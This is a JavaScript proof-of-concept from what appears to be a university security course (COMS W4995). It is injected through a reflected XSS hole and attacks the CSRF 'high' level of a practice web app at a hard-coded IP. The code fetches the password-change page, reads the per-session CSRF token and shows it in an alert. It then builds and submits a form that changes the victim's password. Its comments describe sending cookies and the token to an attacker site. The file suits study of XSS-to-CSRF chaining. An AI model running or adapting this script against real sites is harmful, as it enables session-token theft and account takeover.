/*
COMS W4995
CSRF high demo for re-used csrf token

This script loads via RXSS vulnerability
*/

function steal_token(url){
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document"; //parse html
    xhr.open("GET", url);

    xhr.onload = function(event){
        // extract form and use csrf token embedded
        var dom = xhr.responseXML;
        var form = dom.forms[0];

        //csrf token is vulnerable because it is generated
        //per session, not per request

        alert('CSRF TOKEN STOLEN:' + form[3].value);

        //ideally send document.cookie and
        //csrf token in form[3].value to 
        //attacker site, which should exploit these
        //I do not currently have a webserver (github is static)
        //I demonstrate the second part below

        //The attacker constructs a form on their
        //side and sends with stolen cookie and 
        //csrf token

        // set new_password
        form[0].value='hello';
        form[1].value=form[0].value;

        // //change action from # to /PA4/vulnerabilities/csrf/
        form.action = url;

        // // set value for <input name='Change'>
        // // attach input to form
        var change = document.createElement('input');
        change.name = 'Change';
        change.value = 'Change';
        form.appendChild(change);

        //attach form to body
        document.getElementsByTagName('body')[0].appendChild(form);

        //form submit
        //return false to prevent redirect
        form.submit(function(event){
            event.preventDefault();
            return false;
        });
    };
    xhr.send(null);
}

//csrf token
steal_token('http://35.184.56.63/PA4/vulnerabilities/csrf/');
